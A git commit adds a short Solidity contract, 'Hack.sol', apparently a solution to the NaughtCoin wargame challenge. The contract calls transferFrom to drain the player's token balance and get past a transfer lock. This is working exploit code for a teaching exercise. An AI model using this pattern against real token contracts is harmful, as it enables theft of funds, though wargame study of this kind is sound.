0809ff81bf8d7f8265fa70b756204c75ce695995
lopeselio <lopeselio@gmail.com>
2023-02-11 17:29:48 +0530

    hack contract

---
+++ NaughtCoin/Hack.sol
@@ -0,0 +1,20 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface INaughtCoin {
+    function player() external view returns (address); 
+}
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+}
+
+contract Hack {
+    function hack(IERC20 coin) external {
+        address player = INaughtCoin(address(coin)).player();
+        uint256 bal = coin.balanceOf(player);
+        coin.transferFrom(player, address(this), bal);
+    }
+}
